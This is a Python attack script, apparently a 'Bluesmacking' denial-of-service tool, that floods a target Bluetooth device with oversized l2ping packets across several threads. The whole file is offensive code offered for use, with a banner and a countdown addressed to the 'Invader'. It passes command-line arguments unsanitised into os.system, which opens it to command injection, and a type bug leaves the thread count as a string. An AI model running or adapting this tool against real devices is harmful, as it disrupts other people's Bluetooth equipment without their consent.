# Author: @codigo_n3gro | https://linkedin.com/in/swagneycod3
# Ano: 03/02/2021


import os
import sys
import time
import threading

def DOS(target_addr, packages_size):
    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)

def banner():
    print(''' 
        BLUESMACKING ATTACK

        bluetodown.py target packt
         ''')
         
def main():
    banner()
    time.sleep(0.1)
    print('keep attention')
    if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
        time.sleep(0.1)
        os.system('clear')
        banner()
        print('')

        target_addr = sys.argv[1]

        if len(target_addr) < 1:
            print('[!] ERROR: Target addr is missing')
            exit(0)

        try:
            packages_size = sys.argv[2]
        except:
            print('[!] ERROR: Packages size must be an integer')
            exit(0)
        try:
            threads_count = sys.argv[3]
        except:
            print('[!] ERROR: Threads count must be an integer')
            exit(0)
        print('')
        os.system('clear')

        print("\x1b[31m[*] Wait just 3 seconds my Invader")

        for i in range(0, 3):
            print('[*] ' + str(3 - i))
            time.sleep(1)
     
        print('[*] Building threads...\n')

        for i in range(0, threads_count):
            print('[*] Built thread №' + str(i + 1))
            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()

        print('[*] Built all threads...')
        print('[*] STARTING...')
    else:
        print('RSRSRSRSRSRSRSRSRSRRSRSRS')
        exit(0)

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))         
